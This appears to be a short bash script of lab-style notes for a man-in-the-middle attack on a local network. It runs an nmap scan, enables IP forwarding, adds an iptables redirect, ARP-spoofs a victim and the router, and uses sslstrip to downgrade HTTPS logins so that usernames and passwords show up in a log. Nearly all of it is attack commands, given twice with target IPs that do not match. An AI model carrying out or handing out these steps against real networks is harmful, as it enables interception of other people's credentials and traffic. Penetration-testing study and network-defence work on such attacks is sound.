#!/bin/bash

#!/bin/bash

# nmap scan the network
nmap -Pn -sC -O 192.168.1.1/24

# ip forwarding
cat /proc/sys/net/ipv4/ip_forward

# echo ip forwarding on
echo "1" > /proc/sys/net/ipv4/ip_forward

# iptables
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080

# arp spoof - man in the middle

arpspoof -i wlan0 -t 192.168.1.15 192.168.1.1

# -i wlan0 = interface
# -t 192.168.1.9 = target ip address
# 192.168.1.1 = router

# sslstrip
cd /pentest/web/sslstrip

# start ssl strip
python ./sslstrip.py -f -l 8080

# -l 8080 = listen on port 8080
# -f = add lock favicon

# switch to victim computer

# go to a site that has an ssl login
# when you first go to the site it will be http not https
# click the login link that should take you to a login page with an https url

# the man in the middle logs into the https and then gives the victim the site over http


# have a look at the sslstrip log
more sslstrip.log

# the log will then show you the username and password

# sslstrip set up

# set ipforwarding
echo '1' > /proc/sys/net/ipv4/ip_forward

# run arpspoof
arpspoof -i wlan0 192.168.1.1 192.168.1.8

# set up iptables
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080

# run sslstrip
sslstrip -k -l 8080
